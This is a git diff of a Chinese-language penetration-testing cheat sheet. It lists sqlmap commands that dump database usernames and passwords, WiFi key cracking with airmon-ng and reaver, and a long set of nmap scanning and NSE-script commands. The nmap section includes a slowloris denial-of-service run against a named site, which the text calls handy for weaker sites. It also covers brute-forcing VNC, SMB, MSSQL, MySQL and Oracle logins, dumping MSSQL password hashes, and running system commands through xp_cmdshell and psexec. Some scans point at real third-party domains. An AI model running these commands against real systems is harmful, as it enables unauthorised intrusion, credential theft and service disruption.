@@ -72,23 +72,6 @@ rc4-40            seed              seed-cbc          seed-cfb
 seed-ecb          seed-ofb          sm4-cbc           sm4-cfb
 sm4-ctr           sm4-ecb           sm4-ofb           zlib
 ```
-### SQL注入
-```shell
-sqlmap -u url --dbs --current-user	
-sqlmap -u url --dbms mysql -D dbName --tables
-sqlmap -u url --dbms mysql -T admin --columns
-sqlmap -u url --dbms mysql -T admin -C field1, field2 --dump
-
-sqlmap -u url?id=1
-sqlmap -u url?id=1 --dbs
-sqlmap -u url?id=1 --current-db		#列出当前使用的数据库名
-sqlmap -u url?id=1 --tables -D "db_name"
-sqlmap -u url?id=1 --columns -T "tb_name" -D "db_name"
-sqlmap -u url?id=1 --dump -C "username, password" -T "tb_name" -D "db_name"
-
-sqlmap -u url?id=1 --is-dbs #判断该注入点是否有管理员权限，true表示管理员
-```
-
 ### wifi密码跑字典
 ```shell
 airmon-ng check kill			#杀死进程
@@ -108,9 +91,25 @@ wash -i wlan0mon
 reaver -i wlan0mon -b mac地址 -S -N -vv -c CH值
 ```
 
-### nmap工具
+## sqlmap工具
+```shell
+sqlmap -u url --dbs --current-user	
+sqlmap -u url --dbms mysql -D dbName --tables
+sqlmap -u url --dbms mysql -T admin --columns
+sqlmap -u url --dbms mysql -T admin -C field1, field2 --dump
 
-#### 命令参数
+sqlmap -u url?id=1
+sqlmap -u url?id=1 --dbs
+sqlmap -u url?id=1 --current-db		#列出当前使用的数据库名
+sqlmap -u url?id=1 --tables -D "db_name"
+sqlmap -u url?id=1 --columns -T "tb_name" -D "db_name"
+sqlmap -u url?id=1 --dump -C "username, password" -T "tb_name" -D "db_name"
+
+sqlmap -u url?id=1 --is-dbs #判断该注入点是否有管理员权限，true表示管理员
+```
+
+## nmap工具
+### 命令参数
 ```shell
 -sT    TCP connect() 扫描，这是最基本的 TCP 扫描方式。这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息。    
 -sS    TCP 同步扫描 (TCP SYN)，因为不必全部打开一个 TCP 连接，所以这项技术通常称为半开扫描 (half-open)。这项技术最大的好处是，很少有系统能够把这记入系统日志。不过，你需要 root 权限来定制 SYN 数据包。    
@@ -139,4 +138,135 @@ reaver -i wlan0mon -b mac地址 -S -N -vv -c CH值
 --min_rtt_timeout    设置 nmap 对每次探测至少等待你指定的时间，以毫秒为单位。    
 -M count    置进行 TCP connect() 扫描时，最多使用多少个套接字进行并行的扫描。著作权归LyShark所有 
 
+```
+### 主机发现扫描
+```shell
+# 批量Ping扫描: 批量扫描一个网段的主机存活数.
+[root@localhost ~]# nmap -sP 192.168.1.0/24
+
+# 跳过Ping探测: 有些主机关闭了ping检测,所以可以使用-P0跳过ping的探测,可以加快扫描速度.
+[root@localhost ~]# nmap -P0 192.168.1.7
+
+# 计算网段主机IP: 仅列出指定网段上的每台主机,不发送任何报文到目标主机.
+[root@localhost ~]# nmap -sL 192.168.1.0/24
+
+# 扫描IP地址范围: 可以指定一个IP地址范围
+[root@localhost ~]# nmap -sP 192.168.1.1-10
+
+# 探测开放端口(SYN): 探测目标主机开放的端口,可指定一个以逗号分隔的端口列表(如-PS22,443,80).
+[root@localhost ~]# nmap -PS22,80,443 192.168.1.7
+
+# 探测开放端口(UDP): 探测目标主机开放的端口,可指定一个以逗号分隔的端口列表(如-PS22,443,80).
+[root@localhost ~]# nmap -PU 192.168.1.7
+
+# SYN扫描: 使用SYN半开放扫描
+[root@localhost ~]# nmap -sS 192.168.1.7
+
+# TCP扫描: 扫描开放了TCP端口的设备.
+[root@localhost ~]# nmap -sT 192.168.1.7
+
+# UDP扫描: 扫描开放了UDP端口的设备.
+[root@localhost ~]# nmap -sU 192.168.1.7
+
+# 协议探测: 探测目标主机支持哪些IP协议
+[root@localhost ~]# nmap -sO 192.168.1.7
+
+# 探测目标系统: 扫描探测目标主机操作系统,这里结果仅供参考.
+[root@localhost ~]# nmap -O 192.168.1.7
+
+# 探测服务版本: 用于扫描目标主机服务版本号.
+[root@localhost ~]# nmap -sV 192.168.1.7
+
+# 扫描多台主机: 一次性扫描多台目标主机.
+[root@localhost ~]# nmap 192.168.1.2 192.168.1.7
+
+# 导入扫描文件: 从一个文件中导入IP地址,并进行扫描.
+[root@localhost ~]# cat hosts.txt
+localhost
+www.baidu.com
+192.168.0.1
+[root@localhost ~]# nmap -iL hosts.txt
+
+# 绕过防火墙: 在扫描时通过使用-f参数以及使用--mtu 4/8/16使用分片、指定数据包的MTU,来绕过防火墙.
+[root@localhost ~]# nmap -f 127.0.0.1
+
+# 其他基本:
+nmap localhost    #查看主机当前开放的端口
+nmap -p 1024-65535 localhost    #查看主机端口（1024-65535）中开放的端口
+nmap -PS 192.168.21.163        #探测目标主机开放的端口
+nmap -PS22,80,3306  192.168.21.163    #探测所列出的目标主机端口
+nmap -O 192.168.21.163    #探测目标主机操作系统类型
+nmap -A 192.168.21.163    #探测目标主机操作系统类型
+```
+### 使用脚本扫描
+```shell
+# 扫描WEB敏感目录: 通过使用--script=http-enum.nse可以扫描网站的敏感目录.
+[root@localhost ~]# nmap -p 80 --script=http-enum.nse www.mkdirs.com
+
+# 绕开鉴权: 负责处理鉴权证书(绕开鉴权)的脚本,也可以作为检测部分应用弱口令.
+[root@localhost ~]# nmap --script=auth www.mkdirs.com
+
+# 默认脚本扫描: 脚本扫描,主要是搜集各种应用服务的信息,收集到后可再针对具体服务进行攻击.
+[root@localhost ~]# nmap --script=default www.mkdirs.com
+
+# 检测常见漏洞: 通过使用--script=luln,可以扫描网站的常见漏洞,以及网页的目录结构.
+[root@localhost ~]# nmap --script=vuln www.mkdirs.com
+
+# 内网服务探测: 通过使用--script=broadcast,可以实现在局域网内探查更多服务开启状况.
+[root@localhost ~]# nmap -n -p445 --script=broadcast 127.0.0.1
+
+# 进行WhoIS查询: 通过使用--script whois模块,可以查询网站的简单信息.
+[root@localhost ~]# nmap --script whois www.baidu.com
+
+# 详细WhoIS解析: 利用第三方的数据库或资源,查询详细的WhoIS解析情况.
+[root@localhost ~]# nmap --script external www.baidu.com
+
+# 发现内网网关: 通过使用--script=broadcast-netbios-master-browser可以发现内网网关的地址.
+[root@localhost ~]# nmap --script=broadcast-netbios-master-browser 192.168.1.1
+
+# 发现WEB中Robots文件: 通过使用--script=http-robots.txt.nse可以检测到robots文件内容.
+[root@localhost scripts]# nmap --script=http-robots.txt.nse www.baidu.com
+
+# 检查WEB服务器时间: 检查web服务器的当前时间.
+[root@localhost scripts]# nmap -p 443 --script http-date.nse www.baidu.com
+
+# 执行DOS攻击: dos攻击,对于处理能力较小的站点还挺好用的.
+[root@localhost ~]# nmap --script http-slowloris --max-parallelism 1000 www.mkdirs.com
+
+# 检查DNS子域: 检查目标ns服务器是否允许传送,如果能,直接把子域拖出来就好了.
+[root@localhost scripts]# nmap -p 53 --script dns-zone-transfer.nse -v www.baidu.com
+
+# 查询WEB旁站: 旁站查询,ip2hosts接口该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉.
+[root@localhost scripts]# nmap -p80 --script hostmap-ip2hosts.nse www.baidu.com
+
+# 暴力破解DNS记录: 这里以破解百度的域名为例子,由于内容较多这里简化显示.
+[root@localhost scripts]# nmap --script=dns-brute.nse www.baidu.com
+
+# 内网VNC扫描: 通过使用脚本,检查VNC版本等一些敏感信息.
+[root@localhost ~]# nmap --script=realvnc-auth-bypass 127.0.0.1                                            #检查VNC版本
+[root@localhost ~]# nmap --script=vnc-auth 127.0.0.1                                                       #检查VNC认证方式
+[root@localhost ~]# nmap --script=vnc-info 127.0.0.1                                                       #获取VNC信息
+[root@localhost ~]# nmap --script=vnc-brute.nse --script-args=userdb=/user.txt,passdb=/pass.txt 127.0.0.1  #暴力破解VNC密码
+
+# 内网SMB扫描: 检查局域网中的Samba服务器,以及对服务器的暴力破解.
+[root@localhost ~]# nmap --script=smb-brute.nse 127.0.0.1                                                            #简单尝试破解SMB服务
+[root@localhost ~]# nmap --script=smb-check-vulns.nse --script-args=unsafe=1 127.0.0.1                               #SMB已知几个严重漏
+[root@localhost ~]# nmap --script=smb-brute.nse --script-args=userdb=/user.txt,passdb=/pass.txt 127.0.0.1            #通过传递字段文件,进行暴力破解
+[root@localhost ~]# nmap -p445 -n --script=smb-psexec --script-args=smbuser=admin,smbpass=1233 127.0.0.1             #查询主机一些敏感信息:nmap_service
+[root@localhost ~]# nmap -n -p445 --script=smb-enum-sessions.nse --script-args=smbuser=admin,smbpass=1233 127.0.0.1  #查看会话
+[root@localhost ~]# nmap -n -p445 --script=smb-os-discovery.nse --script-args=smbuser=admin,smbpass=1233 127.0.0.1   #查看系统信息
+
+# MSSQL扫描: 检查局域网中的SQL Server服务器,以及对服务器的暴力破解.
+[root@localhost ~]# nmap -p1433 --script=ms-sql-brute --script-args=userdb=/var/passwd,passdb=/var/passwd 127.0.0.1  #暴力破解MSSQL密码
+[root@localhost ~]# nmap -p 1433 --script ms-sql-dump-hashes.nse --script-args mssql.username=sa,mssql.password=sa 127.0.0.1   #dumphash值
+[root@localhost ~]# nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user" 192.168.137.4 xp_cmdshell      #执行命令
+
+# MYSQL扫描: 检查局域网中的MySQL服务器,以及对服务器的暴力破解.
+[root@localhost ~]# nmap -p3306 --script=mysql-empty-password.nse 127.0.0.1                                             #扫描root空口令
+[root@localhost ~]# nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root 127.0.0.1                         #列出所有用户
+[root@localhost ~]# nmap -p3306 --script=mysql-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 127.0.0.1  #暴力破解MYSQL口令
+
+# Oracle扫描: 检查局域网中的Oracle服务器,以及对服务器的暴力破解.
+[root@localhost ~]# nmap --script=oracle-sid-brute -p 1521-1560 127.0.0.1    #oracle sid扫描
+[root@localhost ~]# nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 127.0.0.1
 ```
